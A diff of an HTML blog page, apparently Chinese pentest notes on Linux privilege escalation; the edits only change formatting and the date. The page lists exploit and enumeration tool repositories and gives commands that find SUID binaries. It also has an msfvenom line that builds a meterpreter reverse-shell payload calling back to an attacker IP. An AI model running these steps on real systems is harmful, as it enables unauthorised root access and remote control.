@@ -87,7 +87,7 @@ var _hmt = _hmt || [];
     <ul class="list-inline">
       <li class="list-inline-item text-muted" title="2018-06-15T03:20:00+03:00">
         <i class="fa fa-clock-o"></i>
-        五 15 六月 2018
+        Fri 15 June 2018
       </li>
       <li class="list-inline-item">
         <i class="fa fa-folder-open-o"></i>
@@ -104,7 +104,7 @@ var _hmt = _hmt || [];
   <div class="content">
     <h4>工具</h4>
 <p>工具镇楼：</p>
-<div class="highlight"><pre><span></span><code>https://github.com/SecWiki/linux-kernel-exploits.git
+<div class="highlight"><pre><span></span>https://github.com/SecWiki/linux-kernel-exploits.git
 https://github.com/offensive-security/exploitdb.git
 https://github.com/mzet-/linux-exploit-suggester.git
 https://github.com/InteliSecureLabs/Linux_Exploit_Suggester.git
@@ -114,7 +114,7 @@ linuxprivchecker： https://www.securitysift.com/download/linuxprivchecker.py
 http://pentestmonkey.net/tools/unix-privesc-check/unix-privesc-check-1.4.tar.gz
 https://github.com/rebootuser/LinEnum
 https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS
-</code></pre></div>
+</pre></div>
 <p><img alt="linux提权" class="img-fluid" src="../images/WechatIMG169.png"/></p>
 <h4>内核漏洞提权</h4>
 <p>利用比如脏牛漏洞提权(CVE-2016-5195) overlayfs （CVE-2015-1328）
@@ -128,13 +128,13 @@ https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/m
 <h4>SUID 提权</h4>
 <p>SUID是赋予文件的一种权限，它会出现在文件拥有者权限的执行位上，具有这种权限的文件会在其执行时，使调用者暂时获得该文件拥有者的权限。也就是如果ROOT用户给某个可执行文件加了S权限，那么该执行程序运行的时候将拥有ROOT权限。</p>
 <p>以下命令可以发现系统上运行的所有SUID可执行文件</p>
-<div class="highlight"><pre><span></span><code>find / -perm -u<span class="o">=</span>s -type f <span class="m">2</span>&gt;/dev/null
+<div class="highlight"><pre><span></span>find / -perm -u<span class="o">=</span>s -type f <span class="m">2</span>&gt;/dev/null
 find / -user root -perm -4000-print2&gt;/dev/null
 find / -user root -perm -4000-exec ls -ldb <span class="o">{}</span> <span class="se">\;</span>
-</code></pre></div>
+</pre></div>
 <p>配合进行提权</p>
-<div class="highlight"><pre><span></span><code>https://gtfobins.github.io/
-</code></pre></div>
+<div class="highlight"><pre><span></span>https://gtfobins.github.io/
+</pre></div>
 <p>下面做个演示</p>
 <h4>环境变量劫持提权</h4>
 <p>如果有一个程序具有ROOT权限，它运行的时候需要调用其他程序，那么我们通过环境变量来挟持它运行我们的payload。我们的payload将拥有ROOT权限。</p>
@@ -149,8 +149,8 @@ find / -user root -perm -4000-exec ls -ldb <span class="o">{}</span> <span class
 <p>OSSEC 2.8 - 'hosts.deny'  提权</p>
 <p>Docker Daemon   提权</p>
 <p>MSF 使用Chkrootkit 0.49  提权</p>
-<div class="highlight"><pre><span></span><code>msfvenom -p linux/x64/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span><span class="m">172</span>.16.251.133 <span class="nv">LPORT</span><span class="o">=</span><span class="m">443</span> -a x64 --platform linux -f elf &gt; payload.elf 
-</code></pre></div>
+<div class="highlight"><pre><span></span>msfvenom -p linux/x64/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span><span class="m">172</span>.16.251.133 <span class="nv">LPORT</span><span class="o">=</span><span class="m">443</span> -a x64 --platform linux -f elf &gt; payload.elf 
+</pre></div>
 <p><img alt="linux提权" class="img-fluid" src="../images/msfchk.png"/></p>
 <p><img alt="linux提权" class="img-fluid" src="../images/msfchk1.png"/></p>
   </div>
